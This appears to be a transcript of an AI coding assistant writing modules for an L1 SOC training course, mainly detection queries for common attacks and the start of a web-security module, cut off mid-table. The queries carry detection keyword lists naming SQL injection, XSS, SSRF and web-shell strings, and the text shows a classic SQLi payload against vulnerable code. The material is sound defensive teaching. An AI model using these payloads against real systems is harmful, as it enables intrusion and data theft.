    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 121.7s)

_Thinking:_

Now let me create Module 19 - Common Attacks.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 19: Common Attacks — Detection & Triage\n\n**Priority: P0 — L1 sees these daily. Recognize patterns, map to MITRE, triage fast.**\n\n---\n\n## 19.1 Attack Categories & Detection Matrix\n\n| Category | Key Attacks | Primary Data Sources | MITRE Tactics |\n|----------|-------------|---------------------|---------------|\n| **Identity** | Brute Force, Password Spray, Credential Stuffing, MFA Bypass | Auth logs (4624/4625/4776), VPN, MFA, Azure AD | Initial Access, Credential Access |\n| **Endpoint** | Malware, Ransomware, Process Injection, LOLBins, Living-off-Land | EDR, Sysmon, 4688, 4104, AMSI | Execution, Defense Evasion, Persistence |\n| **Network** | C2, Lateral Movement, Scanning, Exfil, Tunneling | NDR, Zeek, Firewall, Proxy, NetFlow, DNS | C2, Lateral, Exfil, Discovery |\n| **Web** | SQLi, XSS, SSRF, LFI/RFI, RCE, Web Shell | WAF, App logs, Proxy, EDR (web server) | Initial Access, Execution, Collection |\n| **Email** | Phishing, BEC, Malware Delivery, Consent Phishing | Email Gateway, User Reports, Sandbox | Initial Access |\n| **Identity/AD** | Kerberoasting, AS-REP Roasting, PtH, PtT, Golden/Silver Ticket, Delegation | 4768/4769/4771/4776, BloodHound, EDR | Credential Access, Privilege Escalation, Lateral |\n| **Cloud** | Suspicious Login, Impossible Travel, Privilege Escalation, Data Access | Azure AD/Entra ID, AWS CloudTrail, GCP Audit Logs | Initial Access, Persistence, Collection |\n\n---\n\n## 19.2 Identity Attacks — Detection Patterns\n\n### 1. Brute Force (Single Account, Many Passwords)\n```kql\n// 4625 (Failed) → 4624 (Success) same account, same source, short time\nSecurityEvent\n| where EventID in (4625, 4624)\n| where TargetUserName == \"target_user\"\n| summarize \n    FailCount=countif(EventID==4625),\n    SuccessCount=countif(EventID==4624),\n    FirstFail=minif(TimeGenerated, EventID==4625),\n    LastFail=maxif(TimeGenerated, EventID==4625),\n    FirstSuccess=minif(TimeGenerated, EventID==4624)\n  by TargetUserName, IpAddress, Computer\n| where FailCount >= 10 and SuccessCount > 0\n| where FirstSuccess between (FirstFail .. datetime_add('minute', 30, LastFail))\n```\n\n### 2. Password Spray (Many Accounts, One Password)\n```kql\n// Many accounts, few failures each, same source, short time\nSecurityEvent\n| where EventID == 4625\n| where Status == 0xC000006A  // Bad password\n| summarize \n    TargetAccounts=dcount(TargetUserName),\n    TotalFailures=count(),\n    TimeSpan=max(TimeGenerated) - min(TimeGenerated)\n  by IpAddress, Computer, bin(TimeGenerated, 30m)\n| where TargetAccounts > 10 and TotalFailures < TargetAccounts * 3\n| where TimeSpan < 30m\n```\n\n### 3. Credential Stuffing (Known Breached Creds)\n```kql\n// High volume, many IPs (botnet), known breach lists\nSecurityEvent\n| where EventID == 4625\n| where Status == 0xC000006A\n| join kind=leftouter (\n    ThreatIntel\n    | where IndicatorType == \"Credential\"\n    | project Username=IndicatorValue\n) on $left.TargetUserName == $right.Username\n| where isnotempty(Username)  // Known breached credential\n| summarize Count=count(), UniqueIPs=dcount(IpAddress) by TargetUserName, bin(TimeGenerated, 1h)\n| where Count > 5\n```\n\n### 4. MFA Bypass / Fatigue\n```kql\n// Multiple MFA prompts → Accept\nAzureADSignInLogs\n| where AuthenticationRequirement == \"MFA\"\n| where AuthenticationDetails has \"MFA denied\" or AuthenticationDetails has \"MFA approved\"\n| summarize \n    DenyCount=countif(AuthenticationDetails has \"MFA denied\"),\n    ApproveCount=countif(AuthenticationDetails has \"MFA approved\"),\n    Devices=dcount(DeviceDetail)\n  by UserPrincipalName, bin(TimeGenerated, 1h)\n| where DenyCount > 3 and ApproveCount > 0\n| where Devices > 1\n```\n\n---\n\n## 19.3 Endpoint Attacks — Detection Patterns\n\n### 1. Process Injection (T1055)\n```kql\n// Sysmon EID 8 (CreateRemoteThread) + EID 10 (ProcessAccess VM_READ/WRITE)\nSysmon\n| where EventID in (8, 10)\n| where TargetImage == \"C:\\\\Windows\\\\System32\\\\lsass.exe\"  // Credential theft\n| or (EventID == 8 and SourceImage != TargetImage and TargetImage in (\"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"C:\\\\Windows\\\\explorer.exe\"))\n| project TimeGenerated, Computer, SourceImage, TargetImage, SourceProcessId, TargetProcessId, GrantedAccess\n```\n\n### 2. LOLBin Execution\n```kql\n// Suspicious parent-child + network\nSysmon\n| where EventID == 1\n| where Image has_any (\"certutil.exe\", \"regsvr32.exe\", \"rundll32.exe\", \"mshta.exe\", \"installutil.exe\", \"msbuild.exe\", \"cscript.exe\", \"wscript.exe\")\n| where ParentImage !in (\"cmd.exe\", \"powershell.exe\", \"explorer.exe\")  // Unusual parent\n| join kind=inner (\n    Sysmon\n    | where EventID == 3\n    | project ProcessGuid, DestinationIp, DestinationPort\n) on ProcessGuid\n```\n\n### 3. Ransomware Behavior\n```kql\n// Mass file modification + entropy + ransom notes\nFileEvents\n| where Action in (\"Modified\", \"Created\", \"Renamed\")\n| where Extension in (\".lockbit\", \".contii\", \".blackcat\", \".ransom\") or Entropy > 7.5\n| summarize \n    Count=count(), \n    Extensions=make_set(Extension), \n    RansomNotes=countif(FileName has \"README\" or FileName has \"HOW_TO\" or FileName has \"DECRYPT\")\n  by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 5m)\n| where Count > 100 or RansomNotes > 0\n```\n\n### 4. Persistence (Run Keys, Services, Tasks)\n```kql\n// Sysmon EID 12/13 (Registry) + EID 4 (Service) + 4698 (Task)\nSysmon\n| where EventID in (12, 13)\n| where TargetObject has_any (\"\\\\Run\\\\\", \"\\\\RunOnce\\\\\", \"\\\\Winlogon\\\\\", \"\\\\Services\\\\\", \"\\\\WMI\\\\\")\n| where Image != \"C:\\\\Windows\\\\System32\\\\services.exe\"  // Not legitimate service install\n| project TimeGenerated, Computer, Image, TargetObject, Details, User\n```\n\n---\n\n## 19.4 Network Attacks — Detection Patterns\n\n### 1. C2 Beaconing\n```kql\n// Regular interval, small packets, long duration\n// See Module 15 for detailed query\n```\n\n### 2. Lateral Movement (SMB, RDP, WinRM)\n```kql\n// Internal → Internal on admin ports\nFirewallLogs\n| where SourceIp in (internal_ranges) and DestinationIp in (internal_ranges)\n| where DestinationPort in (445, 3389, 5985, 5986, 135, 139)\n| where Action == \"Allow\"\n| summarize Count=count(), Ports=make_set(DestinationPort) by SourceIp, DestinationIp, bin(TimeGenerated, 1h)\n| where Count > 10\n```\n\n### 3. Internal Scanning\n```kql\n// One source → many destinations, same port\nFirewallLogs\n| where SourceIp in (internal_ranges) and DestinationIp in (internal_ranges)\n| where DestinationPort in (445, 3389, 1433, 3306, 5432, 22, 23)\n| summarize TargetCount=dcount(DestinationIp) by SourceIp, DestinationPort, bin(TimeGenerated, 5m)\n| where TargetCount > 20\n```\n\n### 4. DNS Tunneling\n```kql\n// High entropy subdomains, TXT/NULL, high volume\nDnsEvents\n| extend Subdomain = split(QueryName, \".\")[0]\n| extend Entropy = calculate_shannon_entropy(Subdomain)\n| where Entropy > 3.5 and strlen(Subdomain) > 30\n| where QueryType in (\"TXT\", \"NULL\", \"CNAME\") or ResponseCode == \"NXDOMAIN\"\n| summarize Count=count(), AvgEntropy=avg(Entropy) by SrcIp, bin(TimeGenerated, 1h)\n| where Count > 500\n```\n\n---\n\n## 19.5 Web Attacks — Detection Patterns\n\n### 1. SQL Injection\n```kql\n// WAF / Proxy logs\nWebLogs\n| where cs_uri_query has_any (\"'\", \"\\\"\", \"UNION\", \"SELECT\", \"INSERT\", \"UPDATE\", \"DELETE\", \"DROP\", \"OR 1=1\", \"'--\", \"';--\")\n| or cs_uri_query matches regex @\"(%27|%22|%3B|%2D%2D|%55%4E%49%4F%4E)\"\n| summarize Count=count(), Payloads=make_set(cs_uri_query) by c_ip, cs_host, cs_uri_stem, bin(TimeGenerated, 1h)\n| where Count > 5\n```\n\n### 2. XSS (Cross-Site Scripting)\n```kql\nWebLogs\n| where cs_uri_query has_any (\"<script>\", \"javascript:\", \"onerror=\", \"onload=\", \"alert(\", \"document.cookie\", \"eval(\")\n| or cs_uri_query matches regex @\"(%3Cscript%3E|javascript%3A|onerror%3D|onload%3D)\"\n| summarize Count=count() by c_ip, cs_host, cs_uri_stem, bin(TimeGenerated, 1h)\n```\n\n### 3. SSRF (Server-Side Request Forgery)\n```kql\n// Outbound from web server to internal/metadata\nWebLogs\n| where cs_host in (web_server_ips)\n| where cs_method in (\"GET\", \"POST\")\n| where cs_uri_query has_any (\"169.254.169.254\", \"127.0.0.1\", \"localhost\", \"metadata.google.internal\", \"metadata.azure.com\")\n| or cs_referer has_any (\"169.254.169.254\", \"metadata.\")\n```\n\n### 4. Web Shell\n```kql\n// POST to script with cmd/exec params\nWebLogs\n| where cs_method in (\"POST\", \"PUT\")\n| where cs_uri_stem has_any (\".php\", \".jsp\", \".asp\", \".aspx\", \".cfm\", \".pl\", \".py\")\n| where cs_uri_query has_any (\"cmd=\", \"exec=\", \"shell=\", \"system=\", \"passthru=\", \"eval(\", \"assert(\")\n| summarize Count=count(), Commands=make_set(cs_uri_query) by c_ip, cs_host, cs_uri_stem, bin(TimeGenerated, 1h)\n| where Count > 5\n```\n\n---\n\n## 19.6 AD/Identity Attacks — Detection Patterns\n\n### 1. Kerberoasting\n```kql\n// 4769 with RC4 targeting service accounts\nSecurityEvent\n| where EventID == 4769\n| where TicketEncryptionType == 23  // RC4\n| where TargetUserName has \"@\"  // SPN format\n| summarize Count=count(), Services=make_set(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 1h)\n| where Count > 10\n```\n\n### 2. AS-REP Roasting\n```kql\n// 4768 no pre-auth + 4771 failures\nSecurityEvent\n| where EventID == 4768 and PreAuthType == 0\n| join kind=inner (\n    SecurityEvent\n    | where EventID == 4771\n    | project TargetUserName, TimeGenerated, FailureCode\n) on TargetUserName\n| where FailureCode == 0x18\n```\n\n### 3. Pass-the-Hash\n```kql\n// NTLM success without prior failure, unusual source\nSecurityEvent\n| where EventID == 4624 and LogonType == 3 and AuthenticationPackage == \"NTLM\"\n| join kind=leftanti (\n    SecurityEvent\n    | where EventID == 4625 and LogonType == 3\n    | project TargetUserName, IpAddress, TimeGenerated\n) on TargetUserName, IpAddress\n```\n\n### 4. Golden Ticket\n```kql\n// TGT with anomalous lifetime / PAC\nSecurityEvent\n| where EventID == 4768\n| where TicketOptions has \"renewable\"\n| // Look for: renew-till > 10 years, unusual groups in PAC\n| // Better: EDR detection of forged tickets, krbtgt password age > 180 days\n```\n\n### 5. RBCD (Resource-Based Constrained Delegation)\n```kql\n// 5136: msDS-AllowedToActOnBehalfOfOtherIdentity modified\nSecurityEvent\n| where EventID == 5136\n| where AttributeLDAPDisplayName == \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| where OperationType == \"Add\" or OperationType == \"Replace\"\n| project TimeGenerated, Computer, ObjectDN, AttributeValue, SubjectUserName\n```\n\n---\n\n## 19.7 Cloud Attacks — Detection Patterns\n\n### 1. Impossible Travel\n```kql\nAzureADSignInLogs\n| where ResultType == 0  // Success\n| order by UserPrincipalName, TimeGenerated asc\n| extend PrevTime = prev(TimeGenerated), PrevGeo = prev(Location), PrevIP = prev(IpAddress)\n| where isnotempty(PrevTime)\n| extend TimeDiff = TimeGenerated - PrevTime\n| extend Distance = geo_distance(PrevGeo, Location)  // Custom function\n| extend Speed = Distance / TimeDiff  // km/h\n| where Speed > 1000  // Impossible (plane ~900 km/h)\n| project UserPrincipalName, TimeGenerated, PrevTime, Location, PrevGeo, IpAddress, PrevIP, Speed\n```\n\n### 2. Suspicious App Consent (Consent Phishing)\n```kql\nAzureADAuditLogs\n| where OperationName == \"Consent to application\"\n| where TargetResources has \"Mail.Read\" or TargetResources has \"Files.ReadWrite.All\" or TargetResources has \"User.Read.All\"\n| where InitiatedBy.user.userPrincipalName in (high_value_users)\n| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources, Result, ResultReason\n```\n\n### 3. Privilege Escalation (Role Assignment)\n```kql\nAzureADAuditLogs\n| where OperationName in (\"Add member to role\", \"Add eligible member to role\")\n| where TargetResources has \"Global Administrator\" or TargetResources has \"Privileged Role Administrator\" or TargetResources has \"Security Administrator\"\n| project TimeGenerated, InitiatedBy.user.userPrincipalName, TargetResources, TargetResources.id, Result\n```\n\n---\n\n## 19.8 Attack Chain Correlation — Putting It Together\n\n### Example: Phishing → Ransomware\n```\n1. INITIAL ACCESS (TA0001)\n   Alert: Phishing email delivered (Email Gateway)\n   Evidence: Malicious .docm, user clicked, macro executed\n   MITRE: T1566.001\n\n2. EXECUTION (TA0002)\n   Alert: Suspicious PowerShell (EDR)\n   Evidence: WINWORD → POWERSHELL -enc → Download payload\n   MITRE: T1059.001, T1105\n\n3. PERSISTENCE (TA0003)\n   Alert: Registry Run Key (Sysmon)\n   Evidence: HKCU\\Run\\Update added with payload path\n   MITRE: T1547.001\n\n4. CREDENTIAL ACCESS (TA0006)\n   Alert: LSASS Access (EDR)\n   Evidence: Payload → rundll32 → LSASS OpenProcess VM_READ\n   MITRE: T1003.001\n\n5. LATERAL MOVEMENT (TA0008)\n   Alert: SMB Admin$ Access (NDR)\n   Evidence: Compromised host → File server via SMB admin$\n   MITRE: T1021.002\n\n6. IMPACT (TA0040)\n   Alert: Mass File Encryption (EDR)\n   Evidence: Payload encrypts files, drops ransom note\n   MITRE: T1486\n\nCORRELATION: Single Campaign (same payload hash, same C2, same user)\nESCALATION: P1 → IR Team engaged\n```\n\n---\n\n## 19.9 Interview Questions for This Module\n\n1. **How do you distinguish brute force from password spray in auth logs?**\n   - Brute Force: One account, many passwords, same source. Password Spray: Many accounts, one/few passwords, same source.\n\n2. **What EDR/Sysmon events detect process injection?**\n   - Sysmon EID 8 (CreateRemoteThread), EID 10 (ProcessAccess with VM_READ/WRITE/ALL_ACCESS), EID 25 (Process Tampering). EDR: Memory API monitoring.\n\n3. **How do you detect Kerberoasting?**\n   - 4769 (TGS-REQ) with TicketEncryptionType=23 (RC4) targeting service accounts (SPNs). High volume from single user.\n\n4. **What is RBCD and how do you detect it?**\n   - Resource-Based Constrained Delegation. Detect via 5136: msDS-AllowedToActOnBehalfOfOtherIdentity modification (Add/Replace).\n\n5. **How do you identify impossible travel in cloud logs?**\n   - Successful sign-ins from geographically distant locations within impossible time window (speed > 1000 km/h).\n\n6. **What web attack patterns do you look for in proxy/WAF logs?**\n   - SQLi (UNION, SELECT, '), XSS (<script>, javascript:), SSRF (169.254.169.254, metadata), Web Shell (POST to .php/.asp with cmd=).\n\n7. **How do you correlate a multi-stage attack chain?**\n   - Same payload hash, same C2 infrastructure, same user/host, same timeframe, MITRE tactics in sequence (Initial Access → Execution → Persistence → Cred Access → Lateral → Impact).\n\n8. **What are the key differences between Pass-the-Hash and Pass-the-Ticket?**\n   - PtH: NTLM hash used for NTLM auth (SMB, WinRM). PtT: Kerberos ticket (TGT/ST) injected for Kerberos auth. PtH uses 4776/4624 Type 3; PtT uses 4624 Type 9.\n\n9. **How do you detect DNS tunneling?**\n   - High entropy subdomains, high query volume, TXT/NULL records, regular intervals, NXDOMAIN responses.\n\n10. **What is a \"Golden Ticket\" and how do you detect it?**\n    - Forged TGT using krbtgt hash. Detect: anomalous TGT lifetime/renewal, unusual PAC groups, krbtgt password age > 180 days, EDR forged ticket detection.\n\n---\n\n## 19.10 Study Checklist for Module 19\n\n- [ ] Write KQL for: Brute Force, Password Spray, Credential Stuffing, MFA Bypass\n- [ ] Write KQL for: Process Injection, LOLBin, Ransomware, Persistence\n- [ ] Write KQL for: C2 Beaconing, Lateral Movement, Internal Scanning, DNS Tunneling\n- [ ] Write KQL for: SQLi, XSS, SSRF, Web Shell\n- [ ] Write KQL for: Kerberoasting, AS-REP Roasting, PtH, Golden Ticket, RBCD\n- [ ] Write KQL for: Impossible Travel, Consent Phishing, Cloud Priv Esc\n- [ ] Map example attack chain (Phishing → Ransomware) to MITRE with evidence\n- [ ] Explain correlation methodology (hash, C2, user, host, timeframe, MITRE sequence)\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 20 — Web Security*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/19-common-attacks.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 44.2s)

_Thinking:_

Good, Module 19 is done. Now let me continue with Module 20 - Web Security.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "in_progress"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "in_progress",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 134.3s)

_Thinking:_

Now let me create Module 20 - Web Security.

**Tool: write**

**Input:**
```json
{
  "content": "# Module 20: Web Security\n\n**Priority: P1 — Web apps = major attack surface. L1 investigates WAF/proxy alerts daily.**\n\n---\n\n## 20.1 Web Application Architecture\n\n### Typical 3-Tier Architecture\n```\n┌─────────────┐     ┌─────────────┐     ┌─────────────┐\n│   Client    │────►│   Web/App   │────►│  Database   │\n│  (Browser)  │     │   Server    │     │  (SQL/NoSQL)│\n└─────────────┘     └─────────────┘     └─────────────┘\n       │                   │                   │\n       │                   │                   │\n       ▼                   ▼                   ▼\n┌─────────────┐     ┌─────────────┐     ┌─────────────┐\n│  WAF/Proxy  │     │  App Logs   │     │  DB Audit   │\n│  (Layer 7)  │     │  (App-level)│     │  Logs       │\n└─────────────┘     └─────────────┘     └─────────────┘\n```\n\n### Key Components L1 Monitors\n| Component | Logs | Detection Value |\n|-----------|------|-----------------|\n| **WAF (Web Application Firewall)** | Blocked/Allowed requests, Rule IDs, Attack signatures | **Primary** — SQLi, XSS, RCE, Scanners |\n| **Load Balancer / Reverse Proxy** | Client IP, Headers, Latency, Status codes | DDoS, Anomalous traffic, Geo |\n| **Web Server (IIS/Apache/Nginx)** | Access logs, Error logs, Module logs | 404 enumeration, 500 errors (exploits) |\n| **Application (Custom)** | Business logic logs, Audit trails, API logs | BOLA, IDOR, Auth bypass, Fraud |\n| **Database** | Audit logs, Query logs, Failed logins | SQLi, Data exfil, Privilege escalation |\n| **CDN** | Edge logs, Cache hit/miss, Geo | DDoS, Geo anomalies, Cache poisoning |\n\n---\n\n## 20.2 OWASP Top 10 (2021) — L1 Detection Focus\n\n| Rank | Category | ID | L1 Detection |\n|------|----------|----|--------------|\n| 1 | **Broken Access Control** | A01 | BOLA/IDOR, Privilege escalation, Path traversal |\n| 2 | **Cryptographic Failures** | A02 | Weak TLS, Sensitive data in logs/URLs, Missing HSTS |\n| 3 | **Injection** | A03 | **SQLi, NoSQLi, Command Injection, LDAPi, XPATHi** |\n| 4 | **Insecure Design** | A04 | Missing rate limits, Business logic flaws (hard to detect) |\n| 5 | **Security Misconfiguration** | A05 | Default creds, Debug enabled, Directory listing, Exposed .git |\n| 6 | **Vulnerable/Outdated Components** | A06 | CVE matching, Library version in headers, SBOM |\n| 7 | **Identification & Authentication Failures** | A07 | Brute force, Credential stuffing, Weak MFA, Session fixation |\n| 8 | **Software & Data Integrity Failures** | A08 | Unsigned updates, CI/CD compromise, Deserialization |\n| 9 | **Security Logging & Monitoring Failures** | A09 | **Missing logs, No alerts on anomalies** (meta-detection) |\n| 10 | **Server-Side Request Forgery (SSRF)** | A10 | **Internal metadata access, Cloud metadata, Port scanning** |\n\n---\n\n## 20.3 Injection Attacks — Deep Dive\n\n### 1. SQL Injection (SQLi)\n**Mechanism**: User input concatenated into SQL query without parameterization.\n```sql\n-- Vulnerable\nquery = \"SELECT * FROM users WHERE username = '\" + input + \"'\";\n-- Attack: ' OR '1'='1\n-- Result: SELECT * FROM users WHERE username = '' OR '1'='1'\n```\n\n**Types**:\n| Type | Technique | Detection |\n|------|-----------|-----------|\n| **In-band (Error-based)** | Provoke DB errors → extract info | WAF: Error patterns (ORA-, MySQL, Syntax error) |\n| **In-band (Union-based)** | UNION SELECT 